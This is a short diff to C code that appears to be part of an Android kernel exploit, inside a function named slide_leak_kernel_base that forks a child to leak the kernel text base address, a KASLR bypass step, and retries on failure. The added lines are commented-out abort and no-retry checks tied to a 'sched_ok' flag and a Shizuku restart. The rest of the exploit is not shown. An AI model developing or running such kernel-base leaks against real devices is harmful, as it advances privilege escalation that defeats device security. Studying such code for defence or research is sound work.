@@ -457,6 +457,10 @@ int slide_leak_kernel_base(void) {
         SYSCHK(write(fds[1], &stext, sizeof(stext)));
         _exit(0);
       }
+      // if (atomic_load(&slide_consume_sched_ok) == 0) {
+      //   pr_error("slide abort: sched_ok=0 — stopping, restart Shizuku then retry\n");
+      //   _exit(2);
+      // }
       _exit(1);
     }
 
@@ -466,6 +470,10 @@ int slide_leak_kernel_base(void) {
     SYSCHK(close(fds[0]));
     int status = 0;
     SYSCHK(waitpid(child, &status, 0));
+    // if (WIFEXITED(status) && WEXITSTATUS(status) == 2) {
+    //   pr_error("slide sched_ok=0 — not retrying the slide\n");
+    //   return 0;
+    // }
     if (n != (ssize_t)sizeof(stext) || !WIFEXITED(status) ||
         WEXITSTATUS(status) != 0 || !stext) {
       pr_warning("slide attempt %d failed n=%zd status=%d\n",
